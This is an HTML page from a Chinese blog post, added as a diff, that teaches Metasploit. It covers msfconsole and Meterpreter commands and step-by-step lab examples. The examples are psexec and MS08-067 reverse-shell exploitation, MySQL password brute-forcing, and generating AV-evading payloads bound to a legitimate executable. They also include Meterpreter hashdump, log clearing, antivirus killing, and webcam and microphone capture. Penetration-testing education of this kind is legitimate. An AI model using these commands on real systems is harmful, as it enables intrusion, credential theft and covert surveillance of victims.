@@ -1,0 +1,424 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MSF基本命令及实例 - Nero</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Nero,"> 
+    <meta name="description" content="@TOC
+MSF基本架构
+Rex
+基本功能库，用于完成日常基本任务，无需人工手动编码实现
+处理socker连接访问、协议应答（http/SSL/SMB等）
+编码转换（XOR、Base64、Unico,"> 
+    <meta name="author" content="Nero"> 
+    <link rel="alternative" href="atom.xml" title="Nero" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Nero</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">MSF基本命令及实例</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">MSF基本命令及实例</h1>
+        <div class="stuff">
+            <span>七月 07, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
+<h1 id="MSF基本架构"><a href="#MSF基本架构" class="headerlink" title="MSF基本架构"></a>MSF基本架构</h1><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjAvMDYvMjkvbUc5MnVLelhOVXNoZDFZLnBuZw?x-oss-process=image/format,png" alt="架构图"></p>
+<h2 id="Rex"><a href="#Rex" class="headerlink" title="Rex"></a>Rex</h2><ul>
+<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
+<li>处理socker连接访问、协议应答（http/SSL/SMB等）</li>
+<li>编码转换（XOR、Base64、Unicode）<h2 id="MSF-Core"><a href="#MSF-Core" class="headerlink" title="MSF::Core"></a>MSF::Core</h2></li>
+<li>提供Msf的核心基本API，是框架的核心能力实现库<h2 id="MSF-Base"><a href="#MSF-Base" class="headerlink" title="MSF::Base"></a>MSF::Base</h2></li>
+<li>提供友好的API接口，便于模块调用的库<h2 id="Plugin插件"><a href="#Plugin插件" class="headerlink" title="Plugin插件"></a>Plugin插件</h2></li>
+<li>连接和调用外部扩展功能和系统</li>
+</ul>
+<h2 id="MSF数据库"><a href="#MSF数据库" class="headerlink" title="MSF数据库"></a>MSF数据库</h2><h3 id="恢复数据库"><a href="#恢复数据库" class="headerlink" title="恢复数据库"></a>恢复数据库</h3><ul>
+<li>msfdb reinit 初始化数据库</li>
+</ul>
+<h3 id="技术功能模块（不是流程模块）"><a href="#技术功能模块（不是流程模块）" class="headerlink" title="技术功能模块（不是流程模块）"></a>技术功能模块（不是流程模块）</h3><blockquote>
+<p>都放置在/usr/share/metasploit-framework/modules/下</p>
+</blockquote>
+<ul>
+<li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
+<li>Payload：成功exploit之后，真正在目标系统执行的代码或指令</li>
+</ul>
+<ol>
+<li>Shellcode或系统命令</li>
+<li>三种Payload：/usr/share/metasploit-framework/modules/payloads/<blockquote>
+<p>（1）Single：all-in-one，所有内容都在一个payload<br><br>（2）Stager：目标计算机内存有限时，先传输一个较小的payload用于建立连接<br><br>（3）Stages：利用stager建立的连接下载的后续payload<br></p>
+</blockquote>
+</li>
+<li>Stages、Stages都有多种类型，适用于不同场景</li>
+<li>Shellcode是payload的一种，由于其建立正向/反向shell而得名</li>
+</ol>
+<ul>
+<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有payload的exploit模块）</li>
+<li>Encoders：对payload进行加密，躲避AV检查的模块</li>
+<li>Nops：提高payload稳定性及维持大小</li>
+</ul>
+<h1 id="MSF基本使用和控制台命令-MSFconsole"><a href="#MSF基本使用和控制台命令-MSFconsole" class="headerlink" title="MSF基本使用和控制台命令(MSFconsole)"></a>MSF基本使用和控制台命令(MSFconsole)</h1><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><ul>
+<li>apt install metasploit-framework</li>
+</ul>
+<h2 id="地位"><a href="#地位" class="headerlink" title="地位"></a>地位</h2><ul>
+<li>最流行的用户接口</li>
+<li>几乎可以使用所有MSF功能</li>
+<li>控制台命令支持TAP自动补齐</li>
+<li>支持外部命令的执行（系统命令等）</li>
+<li>启动：msfconsole  / 安静的启动：msfconsole -q</li>
+<li>退出：exit</li>
+</ul>
+<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><ul>
+<li>help  调出所有命令</li>
+<li>help workspace    查看命令详细用法</li>
+<li>workspace -h</li>
+<li>? workspace</li>
+</ul>
+<h2 id="MSF控制台基本命令"><a href="#MSF控制台基本命令" class="headerlink" title="MSF控制台基本命令"></a>MSF控制台基本命令</h2><ul>
+<li>banner —— 显示banner信息</li>
+<li>color —— 启用/禁用颜色提示 —— color true/false</li>
+<li>connect —— 连接服务器的指定端口获取工作在端口上工作的服务的banner信息 —— connect 192.168.1.1 80</li>
+<li>show —— 展示模块信息 —— show payloads<blockquote>
+<p>show options ——显示需要设置的项（进入模块）</p>
+</blockquote>
+</li>
+<li>search —— 搜索模块 —— search ms08-067<blockquote>
+<p>search name:mysql cve:2020 platform:linux type:expoit</p>
+</blockquote>
+</li>
+<li>load —— 调用外部插件 —— load nessus</li>
+<li>unload —— 删除外部插件 —— unload nessus</li>
+<li>loadpath —— 调用指定目录中的其他模块 —— loadpath 路径</li>
+<li>route —— 转发一个会话的其他子网的流量 —— route add 子网地址 子网掩码 sessionsID</li>
+<li>ird —— 开发环境</li>
+<li>resource —— 调用命令资源文件 —— 1.创建.rc文件输入一系列命令，2.msf&gt;下,resource 路径/文件名3.也可以直接msfconsole -r 文件名</li>
+</ul>
+<h2 id="模块内基本命令"><a href="#模块内基本命令" class="headerlink" title="模块内基本命令"></a>模块内基本命令</h2><ul>
+<li>use —— 使用模块 —— use exploit/windows/smb/ms08_067_netapi</li>
+<li>info —— 查看当前模块信息 <blockquote>
+<ol>
+<li>基本信息</li>
+<li>provided by：编者</li>
+<li>Available targets：使用的系统版本</li>
+<li>Basic options：需要设置的项</li>
+<li>payload information：payload信息</li>
+</ol>
+</blockquote>
+</li>
+<li>show options —— 显示需要设置的项</li>
+<li>show target —— 显示适用的系统版本</li>
+<li>show payloads —— 显示适用于当前模块的payloads</li>
+<li>show advanced —— 显示其他非必须项</li>
+<li>show evasion —— 做混淆</li>
+<li>show missing —— 显示还未设置的必须参数</li>
+<li>set —— 设置参数 —— set RHOST 1.1.1.1</li>
+<li>unset —— 取消设置</li>
+<li>setg —— 全局设置 —— setg RHOSTS 1.1.1.1</li>
+<li>unsetg —— 取消全局设置</li>
+<li>save —— 保存配置信息</li>
+<li>edit —— 查看或修改当前模块的源代码</li>
+<li>check —— 检查目标主机漏洞是否存在（并不是所有的模块都有check命令）</li>
+<li>run/exploit —— 运行模块（参数：-j表示后台执行）</li>
+<li>sessions —— 如果后台执行，输入这个命令可以查看当前已经建立的会话（参数：-i 2(id)进入会话）</li>
+<li>back —— 返回上一级</li>
+</ul>
+<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><ul>
+<li>db_rebuild_cache —— 在数据库添加索引，加快搜索速度</li>
+<li>db_disconnect —— 断开当前数据库连接</li>
+<li>db_connect —— 连接数据库 —— db_connect <a href="user:pass">user:pass</a>@<a href="host:port">host:port</a>/<database>（或者指定配置文件完整路径，/usr/share/metasploit-framework/config/database.yml）</li>
+<li>db_nmap —— 集成nmap，扫描结果会保存在数据库中 —— 参数和nmap参数一样 <blockquote>
+<ol>
+<li>查询数据库主机，hosts 123.57.251.23</li>
+<li>搜索, hosts -S linux</li>
+<li>端口信息, services -c port(要显示的列) -p 80(要搜索的端口)</li>
+</ol>
+</blockquote>
+</li>
+<li>creds —— 查看获取到的登录的账号密码</li>
+<li>vulns —— 查看数据库中已查询到的主机漏洞信息</li>
+<li>loot —— 查看获取到的哈希值信息</li>
+<li>db_export —— 数据库导出 —— db_export -f xml /home/kali/test.xml</li>
+<li>db_import —— 数据库导入 —— db_import 文件名</li>
+</ul>
+<h2 id="Exploit模块"><a href="#Exploit模块" class="headerlink" title="Exploit模块"></a>Exploit模块</h2><h3 id="Active-exploits（主动exploit）"><a href="#Active-exploits（主动exploit）" class="headerlink" title="Active exploits（主动exploit）"></a>Active exploits（主动exploit）</h3><blockquote>
+<p>利用服务器开放端口漏洞</p>
+</blockquote>
+<ul>
+<li>实例：利用psexec远程执行漏洞攻击windows<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec      &#x2F;&#x2F;使用Active exploit模块</span><br><span class="line">set RHOST 192.168.126.129       &#x2F;&#x2F;配置被攻击者Ip地址</span><br><span class="line">set PAYLOAD windows&#x2F;shell&#x2F;reverse_tcp   &#x2F;&#x2F;配置payload</span><br><span class="line">set LHOST 192.168.1.1       &#x2F;&#x2F;配置接收反弹shell的主机地址（本机地址）</span><br><span class="line">set LPORT 4444      &#x2F;&#x2F;配置接收反弹shell的主机端口</span><br><span class="line">set SMBUSER user1   &#x2F;&#x2F;配置被攻击者的管理员账号</span><br><span class="line">set SMBPASS pass1   &#x2F;&#x2F;配置被攻击者的管理员密码</span><br><span class="line">exploit     &#x2F;&#x2F;执行</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="Passive-exploits（被动exploit）"><a href="#Passive-exploits（被动exploit）" class="headerlink" title="Passive exploits（被动exploit）"></a>Passive exploits（被动exploit）</h3><blockquote>
+<p>利用客户端程序漏洞</p>
+</blockquote>
+<ul>
+<li>实例：利用ani_loadimage_chunksize模块攻击windows<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;browser&#x2F;ani_loadimage_chunksize</span><br><span class="line">set SRVHOST 192.168.126.131   &#x2F;&#x2F;设置网站地址</span><br><span class="line">set URIPATH &#x2F;       &#x2F;&#x2F;设置网站路径</span><br><span class="line">set PAYLOAD windows&#x2F;shell&#x2F;reverse_tcp   &#x2F;&#x2F;设置payload</span><br><span class="line">set LHOST 192.168.1.1       &#x2F;&#x2F;设置监听地址</span><br><span class="line">set LPORT 4444              &#x2F;&#x2F;设置监听端口</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><ul>
+<li>search shell_bind_tcp       //搜索payload</li>
+<li>use 40      //选择要使用的payload</li>
+<li>show options    //查看需要设置的参数，注意：在payload中，LPORT表示本地（被攻击者）要开放的端口，RHOST表示允许获取shell的远程主机IP</li>
+<li>generate    //生成16进制payload <blockquote>
+<ol>
+<li>generate -b ‘\x00\xff’可以过滤掉坏字符）</li>
+<li>generate -e x86/nonalpha  —— 手动指定encoder</li>
+<li>generate -b ‘\x00’ -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</li>
+<li>-b 排除坏字符，-t 输出什么格式，-e 指定encoder，-i 编码几轮，-k 不产生新的进程，-x 可以把payload绑定到的模板，-f /root/1.exe。</li>
+</ol>
+</blockquote>
+</li>
+<li>nc 192.168.1.114 4444 —— 被攻击者点击文件后，开放4444端口，直接连接即可</li>
+<li>NOP(no-operation/Next Operation（无任何操作）)<blockquote>
+<ol>
+<li>EIP返回到存储NOP sled的任意地址时将递增，最终导致shellcode执行</li>
+<li>generate -s 14（给payload加上14字节的nop前缀）</li>
+</ol>
+</blockquote>
+</li>
+</ul>
+<h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul>
+<li>高级、动态、可扩展的Payload<blockquote>
+<ol>
+<li>基于meterpreter上下文利用更多漏洞发起攻击</li>
+<li>后渗透测试阶段一站式操作界面</li>
+</ol>
+</blockquote>
+</li>
+<li>完全基于内存的DLL注入式payload（不写硬盘）<blockquote>
+<ol>
+<li>注入合法系统进程并建立stager</li>
+<li>基于Stager上传和预加载DLL进行扩展模块的注入（客户端API）</li>
+<li>基于Stager建立的socket连接建立加密的TLS/1.0通信隧道</li>
+<li>利用TLS隧道进一步加载后续扩展模块（避免网络取证）</li>
+</ol>
+</blockquote>
+</li>
+<li>服务端用C语言编写</li>
+<li>客户端提供基于ruby的全特性API（支持任何语言）</li>
+</ul>
+<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><ul>
+<li>set payload windows/metepreter/reverse_tcp  —— 配置payload的时候配置shell为meterpreter</li>
+<li>windows和linux命令大部否都支持（ls,dir,cd,cat,mkdir,rmdir.mv,rm,edit(编辑类似vi)）</li>
+<li>help  —— 帮助</li>
+<li>pwd —— 查看当前空座目录</li>
+<li>lpwd —— kali上当前工作目录</li>
+<li>lcd —— 在kali上切换目录</li>
+<li>run —— 运行脚本</li>
+<li>bgrun —— 后台运行脚本 —— bgrun vnc(打开桌面监控)/sound_recorder(打开麦克风)/webcam(打开摄像头)/killav(杀死杀毒软件)/winbf(用肉机暴力破解)/</li>
+<li>clearev —— 清除日志</li>
+<li>download —— 下载目标系统上的文件</li>
+<li>upload —— 上传文件</li>
+<li>execute —— 执行文件 —— execute -f cmd.exe -i -H （-f 执行什么程序，-i 交互，-H 隐藏）</li>
+<li>gituid —— 查看当前账户</li>
+<li>getsystem —— 提权到system</li>
+<li>getprivs —— 查看当前权限</li>
+<li>getproxy —— 获取代理</li>
+<li>ps —— 查看当前工作着的进程</li>
+<li>getpid —— 查看自己注入的进程pid</li>
+<li>migrate —— 迁移注入的进程 —— migrate 652</li>
+<li>hashdump —— 获取系统账号密码hash值</li>
+<li>sysinfo —— 查看系统信息</li>
+<li>kill —— 杀死进程 —— kill 1052</li>
+<li>reboot —— 重启</li>
+<li>shutdown —— 关机</li>
+<li>shell —— 获取操作系统shell</li>
+<li>show_mount —— 查看硬盘使用情况</li>
+<li>search —— 搜索文件 —— search -f data.ini</li>
+<li>arp —— 查看arp缓存</li>
+<li>netstat —— 查看端口开放情况</li>
+<li>ipconfig/ifconfig —— 查看ip地址</li>
+<li>idletime —— 查看操作系统空闲时间</li>
+<li>resource —— 调度外部资源文件（类似msf的resource）</li>
+<li>record_mic —— 记录麦克风出现的声音</li>
+<li>webcam_list —— 列出靶机上连接的所有摄像头</li>
+<li>webcam_snap -i -v false —— 每隔1秒拍个照</li>
+</ul>
+<h4 id="Meterpreter-python扩展"><a href="#Meterpreter-python扩展" class="headerlink" title="Meterpreter python扩展"></a>Meterpreter python扩展</h4><ul>
+<li>2015年11月份，来自社区的贡献</li>
+<li>无需运行环境，在客户端运行原生python代码</li>
+<li>load python （加载插件。meterpreter&gt;环境下）</li>
+<li>Help</li>
+<li>python_execute “print(“Hello world!”)”</li>
+<li>python_execute “import os;cd = os.getcwd()” -r cd （-r 表示返回出来的变量）</li>
+<li>python_import -f find.py</li>
+</ul>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><h3 id="暴力破解mysql数据库密码"><a href="#暴力破解mysql数据库密码" class="headerlink" title="暴力破解mysql数据库密码"></a>暴力破解mysql数据库密码</h3><ul>
+<li>找到并使用mysql_login模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search mysql_login</span><br><span class="line">use mysql_login</span><br></pre></td></tr></table></figure></li>
+<li>查看需要设置的项<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure></li>
+<li>设置主机，用户名，和密码字典<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 127.0.0.1</span><br><span class="line">set USERNAME lrf</span><br><span class="line">set BLANK_PASSWORDS true   &#x2F;&#x2F;检测空密码</span><br><span class="line">set PASS_FILE &#x2F;home&#x2F;kali&#x2F;ruo.txt</span><br></pre></td></tr></table></figure></li>
+<li>执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run&#x2F;expoit    &#x2F;&#x2F;出现绿色加号证明成功</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="ms08-o67经典漏洞利用（xp）"><a href="#ms08-o67经典漏洞利用（xp）" class="headerlink" title="ms08-o67经典漏洞利用（xp）"></a>ms08-o67经典漏洞利用（xp）</h3><ul>
+<li>找到并使用ms08-067<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search ms08_067</span><br><span class="line">use ms08_067_netapi</span><br></pre></td></tr></table></figure></li>
+<li>查看需要设置的项并挨个设置<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set RHOST 192.168.1.1</span><br></pre></td></tr></table></figure></li>
+<li>查看并设置主机系统版本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show targets</span><br><span class="line">set target 34</span><br></pre></td></tr></table></figure></li>
+<li>查看并设置payloads<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br><span class="line">set payload windows&#x2F;shell&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.1.1</span><br></pre></td></tr></table></figure></li>
+<li>执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/qq/001faIUs4M2zna.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://music.xf1433.com/up/view.php/9afe0c372d5dd4641033e61ae0fa82de.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E5%9F%BA%E6%9C%AC%E6%9E%B6%E6%9E%84"><span class="toc-number">1.</span> <span class="toc-text">MSF基本架构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Rex"><span class="toc-number">1.1.</span> <span class="toc-text">Rex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-Core"><span class="toc-number">1.2.</span> <span class="toc-text">MSF::Core</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF-Base"><span class="toc-number">1.3.</span> <span class="toc-text">MSF::Base</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Plugin%E6%8F%92%E4%BB%B6"><span class="toc-number">1.4.</span> <span class="toc-text">Plugin插件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.5.</span> <span class="toc-text">MSF数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.5.1.</span> <span class="toc-text">恢复数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97%EF%BC%88%E4%B8%8D%E6%98%AF%E6%B5%81%E7%A8%8B%E6%A8%A1%E5%9D%97%EF%BC%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">技术功能模块（不是流程模块）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%92%8C%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%91%BD%E4%BB%A4-MSFconsole"><span class="toc-number">2.</span> <span class="toc-text">MSF基本使用和控制台命令(MSFconsole)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0"><span class="toc-number">2.1.</span> <span class="toc-text">更新</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%B0%E4%BD%8D"><span class="toc-number">2.2.</span> <span class="toc-text">地位</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%AE%E5%8A%A9%E5%91%BD%E4%BB%A4"><span class="toc-number">2.3.</span> <span class="toc-text">帮助命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%8E%A7%E5%88%B6%E5%8F%B0%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">2.4.</span> <span class="toc-text">MSF控制台基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%86%85%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">2.5.</span> <span class="toc-text">模块内基本命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C"><span class="toc-number">2.6.</span> <span class="toc-text">数据库操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit%E6%A8%A1%E5%9D%97"><span class="toc-number">2.7.</span> <span class="toc-text">Exploit模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Active-exploits%EF%BC%88%E4%B8%BB%E5%8A%A8exploit%EF%BC%89"><span class="toc-number">2.7.1.</span> <span class="toc-text">Active exploits（主动exploit）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Passive-exploits%EF%BC%88%E8%A2%AB%E5%8A%A8exploit%EF%BC%89"><span class="toc-number">2.7.2.</span> <span class="toc-text">Passive exploits（被动exploit）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%9F%E6%88%90payload"><span class="toc-number">2.7.3.</span> <span class="toc-text">生成payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter"><span class="toc-number">2.7.4.</span> <span class="toc-text">Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.7.4.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.7.4.2.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter-python%E6%89%A9%E5%B1%95"><span class="toc-number">2.7.4.3.</span> <span class="toc-text">Meterpreter python扩展</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">3.</span> <span class="toc-text">实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81"><span class="toc-number">3.0.1.</span> <span class="toc-text">暴力破解mysql数据库密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms08-o67%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88xp%EF%BC%89"><span class="toc-number">3.0.2.</span> <span class="toc-text">ms08-o67经典漏洞利用（xp）</span></a></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
